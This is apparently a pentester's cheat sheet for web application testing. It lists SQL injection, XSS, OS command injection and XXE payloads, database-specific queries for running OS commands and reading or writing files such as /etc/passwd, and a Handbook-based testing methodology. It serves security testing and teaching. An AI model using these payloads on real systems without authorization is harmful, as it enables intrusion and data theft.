# Web Application Cheat Sheet
## Top Resources
* [The Web Application Hacker’s Handbook](https://repo.zenk-security.com/Magazine%20E-book/The%20web%20application%20hackers%20handbook%20finding%20and%20exploiting%20security%20flaws%20-ed2%202011.pdf)
* [OWASP Top 10 – 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [PortSwigger - Vulnerability Descriptions & Remediations](https://portswigger.net/kb/issues)

## Tools
* [URL Encoder/Decoder](https://meyerweb.com/eric/tools/dencoder/)
* [CyberChef](https://gchq.github.io/CyberChef/)
* [Burp - Turbo Intruder](https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack)

## All Purpose Payloads
**SQL Injection**
* `'`
* `%27`
* ` OR 1=1-- `
* `' OR 1=1#`
* `' OR 'a'='a`
* `foo', 1, 1, 1)-- `
* `' union select null, null, null, null;-- `

**XSS**
* `"><script>alert(document.cookie)</script>`
* `"><script>alert(1)</script>`
* `" onfocus="alert(1)`
* `'; alert(1); var foo='`
* `javascript:alert(1);`
* `<script><script>alert(1)</script>`
* `<scr<script>ipt>alert(1)</script>`
* `<scr<object>ipt>alert(1)</script>`

**OS Command Injection**
* `|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &`
* `%7C%7C%20ping%20-i%2030%20127.0.0.1%20%3B%20x%20%7C%7C%20ping%20-n%2030%20127.0.0.1%20%26`

## SQL Injection
**Database Fingerprinting ('services')**
* Oracle
	- `'serv'||'ices'`
* MS-SQL
	- `'serv'+'ices'`
* MySQL
	- `'serv' 'ices'` (note the space)

**Interact with OS**
* MS-SQL
	- `exec xp_cmdshell 'dir'`
	- `master..xp_cmdshell 'ipconfig > foo.txt'`
* MySQL
	- `SELECT load_file('/etc/passwd')`
	- `select * from test into outfile '/etc/hosts.equiv'`

**Current user**
* Oracle
	- `select Sys.login_user from dual SELECT user FROM dual SYS_CONTEXT('USERENV','SESSION_USER')`
* MS-SQL
	- `select suser_sname()`
* MySQL
	- `select user()`

**Time delay**
* Oracle
	- `utl_Http.request('http://sadfdkln-doesntexist-klnasdf.com')`
* MS-SQL
	- `waitfor delay '0:0:10'`
	- `exec master..xp_cmdshell 'ping localhost'`
* MySQL
	- `sleep(5)`

**Version**
* Oracle
	- `select banner from v$version`
* MS-SQL
	- `select @@version`
* MySQL
	- `select @@version`

**Current database**
* Oracle
	- `SELECT SYS_CONTEXT('USERENV', 'DB_NAME') FROM dual`
* MS-SQL
	- `SELECT db_name()`
	-  The server name can be retrieved using:
		* `SELECT @@servername`
* MySQL
	- `SELECT database()`

**Current user’s privileges**
* Oracle
	- `SELECT privilege FROM session_privs`
* MS-SQL
	- `SELECT grantee, table_name, privilege_type FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES`
* MySQL
	- `SELECT * FROM information_schema.user_privileges WHERE grantee = '[user]'`
		* Where `[user]` is determined from the output of `SELECT user()`

**Show all tables and columns in a single column of results**
* Oracle
	- `Select table_name||' '||column_name from all_tab_columns`
* MS-SQL
	- `SELECT table_name+''+column_name from information_schema.columns`
* MySQL
	- `select concat(table_name,column_name) from information_schema.columns;`

**Select user tables**
* Oracle
	- `SELECT object_name, object_type FROM user_objects WHERE object_type='TABLE'`
	- Or to show all tables to which the user has access:
		* `SELECT table_name FROM all_tables`
* MS-SQL
	- `SELECT name FROM sysobjects WHERE xtype='U'`
* MySQL
	- `SELECT table_name FROM information_schema.tables where table_type='BASE TABLE' and table_schema!='mysql'`

**Show column names for table foo**
* Oracle
	- `SELECT column_name, name FROM user_tab_columns WHERE table_name = 'FOO'`
	- Use the `ALL_tab_columns` table if the target data is not owned by the current application user.
* MS-SQL
	- `SELECT column_name FROM information_schema.columns WHERE table_name='foo'`
* MySQL
	- `SELECT column_name FROM information_schema.columns WHERE table_name='foo'`

## XML External Entity
* Call the external entity with `&sp;`
* `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "file:///etc/passwd">]>`
* `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">]>`
* `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "http://192.168.140.135/robots.txt">]>`

## Methodology
From "The Web Application Hacker's Handboook"
1. Map the Application’s Content
	1. Explore Visible Content
	2. Consult Public Resources
	3. Discover Hidden Content
	4. Discover Default Content
	5. Enumerate Identifier-Specified Functions
	6. Test for Debug Parameters
2. Analyze the Application
	1. Identify Functionality
	2. Identify Data Entry Points
	3. Identify the Technologies Used
	4. Map the Attack Surface
3. Test Client-Side Controls
	1. Test Transmission of Data Via the Client
	2. Test Client-Side Controls Over User Input
	3. Test Browser Extension Components
4. Test the Authentication Mechanism
	1. Understand the Mechanism
	2. Test Password Quality
	3. Test for Username Enumeration
	4. Test Resilience to Password Guessing
	5. Test Any Account Recovery Function
	6. Test Any Remember Me Function
	7. Test Any Impersonation Function
	8. Test Username Uniqueness
	9. Test Predictability of Autogenerated Credentials
	10. Check for Unsafe Transmission of Credentials
	11. Check for Unsafe Distribution of Credentials
	12. Test for Insecure Storage
	13. Test for Logic Flaws
	14. Exploit Any Vulnerabilities to Gain Unauthorized Access
5. Test the Session Management Mechanism
	1. Understand the Mechanism
	2. Test Tokens for Meaning
	3. Test Tokens for Predictability
	4. Check for Insecure Transmission of Tokens
	5. Check for Disclosure of Tokens in Logs
	6. Check Mapping of Tokens to Sessions
	7. Test Session Termination
	8. Check for Session Fixation
	9. Check for CSRF
	10. Check Cookie Scope
6. Test Access Controls
	1. Understand the Access Control Requirements
	2. Test with Multiple Accounts
	3. Test with Limited Access
	4. Test for Insecure Access Control Methods
7. Test for Input-Based Vulnerabilities
	1. Fuzz All Request Parameters
	2. Test for SQL Injection
	3. Test for XSS and Other Response Injection
	4. Test for OS Command Injection
	5. Test for Path Traversal
	6. Test for Script Injection
	7. Test for File Inclusion
8. Test for Function-Specific Input Vulnerabilities
	1. Test for SMTP Injection
	2. Test for Native Software Vulnerabilities
	3. Test for SOAP Injection
	4. Test for LDAP Injection
	5. Test for XPath Injection
	6. Test for Back-End Request Injection
	7. Test for XXE Injection
9. Test for Logic Flaws
	1. Identify the Key Attack Surface
	2. Test Multistage Processes
	3. Test Handling of Incomplete Input
	4. Test Trust Boundaries
	5. Test Transaction Logic
10. Test for Shared Hosting Vulnerabilities
	1. Test Segregation in Shared Infrastructures
	2. Test Segregation Between ASP-Hosted Applications
11. Test for Application Server Vulnerabilities
	1. Test for Default Credentials
	2. Test for Default Content
	3. Test for Dangerous HTTP Methods
	4. Test for Proxy Functionality
	5. Test for Virtual Hosting Misconfiguration
	6. Test for Web Server Software Bugs
	7. Test for Web Application Firewalling
12. Miscellaneous Checks
	1. Check for DOM-Based Attacks
	2. Check for Local Privacy Vulnerabilities
	3. Check for Weak SSL Ciphers
	4. Check Same-Origin Policy Configuration
13. Follow Up Any Information Leakage


